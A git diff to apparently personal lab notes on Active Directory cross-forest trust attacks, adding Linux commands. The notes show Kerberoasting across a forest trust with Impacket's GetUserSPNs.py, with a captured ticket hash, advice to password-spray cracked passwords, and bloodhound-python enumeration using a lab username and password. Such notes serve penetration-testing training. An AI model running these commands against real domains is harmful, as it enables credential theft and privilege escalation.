@@ -8,6 +8,7 @@
     - [Linux](#linux)
 - [Attacking Cross-Forest Trust Abuse](#attacking-cross-forest-trust-abuse)
     - [Windows](#windows-1)
+    - [Linux](#linux-1)
 
 
 ## Overview
@@ -789,4 +790,71 @@ Windows IP Configuration
     - SID History can also be abused across a forest trust.
     - If a user is migrated from one forest to another and SID Filtering is not enabled, it becomes possible to add a SID from the other forest, and this SID will be added to the user's token when authenticating across the trust.
     - If the SID of an account with administrative privileges in Forest A is added to the SID history attribute of an account in Forest B, assuming they can authenticate across the forest, then this account will have administrative privileges when accessing resources in the partner forest.
-    
+
+
+### Linux
+
+```bash
+# Using GetUserSPNs.py
+GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+Password:
+ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
+-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
+MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never> 
+
+# Add -request flag gives us the TGS ticket.
+GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  
+
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+Password:
+ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
+-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
+MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>               
+
+
+$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$10<SNIP>
+
+```
+
+> [!TIP]
+> Suppose we can Kerberoast across a trust and have run out of options in the current domain. In that case, it could also be worth attempting a single password spray with the cracked password, as there is a possibility that it could be used for other service accounts if the same admins are in charge of both domains. Here, we have yet another example of iterative testing and leaving no stone unturned.
+
+#### Hunting Foreign Group Membership with [Bloodhound-python](https://github.com/dirkjanm/BloodHound.py)
+
+- We may, from time to time, see users or admins from one domain as members of a group in another domain.
+- Since only Domain Local Groups allow users from outside their forest, it is not uncommon to see a highly privileged user from Domain A as a member of the built-in administrators group in domain B when dealing with a bidirectional forest trust relationship.
+
+```bash
+# Running bloodhound-python Against INLANEFREIGHT.LOCAL
+bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
+
+INFO: Found AD domain: inlanefreight.local
+INFO: Connecting to LDAP server: ACADEMY-EA-DC01
+INFO: Found 1 domains
+INFO: Found 2 domains in the forest
+INFO: Found 559 computers
+INFO: Connecting to LDAP server: ACADEMY-EA-DC01
+INFO: Found 2950 users
+INFO: Connecting to GC LDAP server: ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL
+INFO: Found 183 groups
+INFO: Found 2 trusts
+
+<SNIP>
+
+# Compressing the File with zip -r
+zip -r ilfreight_bh.zip *.json
+
+# Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL
+bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
+
+```
+
+- After uploading the second set of data (either each JSON file or as one zip file), we can click on Users with Foreign Domain Group Membership under the Analysis tab and select the source domain as INLANEFREIGHT.LOCAL. 
+- Here, we will see the built-in Administrator account for the INLANEFREIGHT.LOCAL domain is a member of the built-in Administrators group in the FREIGHTLOGISTICS.LOCAL domain as we saw previously.
+
+![Foreign membership](/images/foreign_membership.jpg)
+
